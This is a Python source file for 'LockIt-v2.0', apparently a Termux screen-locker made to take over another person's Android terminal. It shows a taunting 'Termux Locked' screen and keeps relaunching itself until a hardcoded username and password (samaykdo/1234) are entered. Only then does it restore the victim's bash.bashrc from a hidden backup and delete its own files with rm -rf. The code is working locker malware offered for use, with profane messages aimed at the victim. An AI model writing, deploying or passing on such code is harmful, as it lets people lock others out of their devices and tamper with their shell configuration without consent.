# coded by samay 
# Lock-it tool for termux 
# Team Sincryption
# Idea by Kdo 
# Collab Kdo x zork 

# ---------------

import os
import sys
import time
import subprocess
from pathlib import Path
from secrets import compare_digest
try:
    import requests
    import pwinput
    import colorama
except ImportError:
    _ = os.system('pip install pwinput' if os.name=='nt' else 'pip3 install pwinput')
    _ = os.system('pip install requests' if os.name=='nt' else 'pip3 install requests')
    _ = os.system('pip install colorama' if os.name=='nt' else 'pip3 install colorama')
import requests
import shutil
from pwinput import pwinput
from colorama import Fore
import random


gh = subprocess.check_output(['whoami']).decode().strip()
if gh.startswith('u0_'):
    pass
else:
    os.system('clear')
    print('\n')
    print(Fore.GREEN+'For Linux ! Tool is under Development ....')
    print('\n')
    sys.exit()
# ------------ colors

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"
g = "\033[0;90m"
gg = "\033[1;32m"
y = r

# --------------- banner 

def banner():
    b1="\033[1;32m"
    g=r
    w1=b
    print(w1+"/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\//")
    print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
    print("/\/\                                                      /\/\\")
    print("\/\/"+b1+"  <Program>"+g+"       LockIt-v2.0      "+b1+" </Program>"+w1+"        \/\/")
    print("/\/\  "+b1+"        </>  "+g+"Team Sincryption !!! "+b1+"</>"+w1+"               /\/\\")
    print("\/\/                                                      \/\/")
    print("/\/\  "+b1+"<Developer>  "+g+"      Zork x Kdo     "+b1+"</Developer>"+w1+"      /\/\\")
    print("\/\/  "+b1+"<Github>  "+g+"https://tinyurl.com/prosamay7"+b1+"  </Github>"+w1+"  \/\/") 
    print("/\/\                                                      /\/\\")
    print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
    print("/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\")
    print('\n')

# ----- Designs of text printing



def Type(data):
    print(gg+"└─ "+w+"\033[1;37m"+data)

def Type_2_design(data):
    print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m {data}"+r)


def Loops(self):
    pass


def Randomcolors():
    data = [
        Fore.YELLOW,
        Fore.RED,
        Fore.GREEN

    ]
    return random.choice(data)

#-------- System Commands

def systemclear():
    return os.system('cls' if os.name=='nt' else 'clear')

def ReturnMain_File():
    Type_2_design(Randomcolors()+'Restarting the Script ....')
    return os.system('python main.py' if os.name=='nt' else 'python3 main.py')

def backslash():
    print('\n')



class TeamSin:
    def Logic(self,username,password):
        self.username = username
        self.password = password


    def MainFunction(self):
        if self.username == 'samaykdo' and self.password == '1234':
            systemclear()
            banner()
            Type('Password Correct .....')
            try:
                time.sleep(2)
                self.actulpath = Path(os.getcwd()+'/')
                self.pathautomate = Path('/data/data/com.termux/files/usr/etc/')
                self.currentlocation = Path(os.path.expanduser('~') + '/.Configs/')
                os.chdir(self.currentlocation)
                with open('.Oldconfig_termux_Rc','r') as filecopy:
                    os.chdir(self.pathautomate)
                    with open('bash.bashrc','w') as fileswrite:
                        shutil.copyfileobj(filecopy,fileswrite)
                os.chdir(self.actulpath)
                self.origin = Path(os.path.expanduser('~')+'/')
                os.chdir(self.origin)
                shutil.rmtree('.Configs/')
                os.system('rm -rf .bashrc .samaykdo.py')
                try:
                    os.system(f'rm -rf {os.path.expanduser("~")}/.termux/Sin_78/.samaykdo.py')
                except:
                    pass
                
                os.chdir(self.actulpath)
                os.system('clear')
                systemclear()
                banner()
                Type('Restart the Termux ....')
                Type('Termux Restored ....')
                time.sleep(1.5)
                print('\n')
                while True:
                    os.system('clear')
                    
            except:
                pass

            
        else:
            systemclear()
            banner()
            Type('Wrong Password .....')
            os.system('python .samaykdo.py' if os.name=='nt' else 'python3 .samaykdo.py')





class Main(TeamSin):

    def __init__(self):
        systemclear()
        banner()
        print(Fore.RED+"         You can't Escape without Clearing Data")
        print('\n')
        print(Randomcolors() + '                  Termux Locked')
        print(Randomcolors() + '          F**ked Your Termux by *********')
        backslash()
        self.ins = pwinput(gg+"└─"+w+"\033[1;37m Do you want to Try Login&pass [y/n] : "+Fore.GREEN,"*").strip()
        if self.ins == 'n' or self.ins == 'N':
            backslash()
            Type('Your n type doesnt mean it will unlock you fool !')
            os.system('python .samaykdo.py' if os.name=='nt' else 'python3 .samaykdo.py')
        else:
            systemclear()
            banner()



    def MainFunc(self):
        super().Logic(self.User,self.Password)
        super().MainFunction()



if __name__ == '__main__':
    TeamSinc = Main()
    TeamSinc.User = pwinput(gg+"└─"+w+"\033[1;37m Enter the Username : "+Fore.GREEN,"*").strip().replace(' ','')
    TeamSinc.Password = pwinput(gg+"└─"+w+"\033[1;37m Enter the Password : "+Fore.GREEN,"*").strip().replace(' ','')
    TeamSinc.MainFunc()







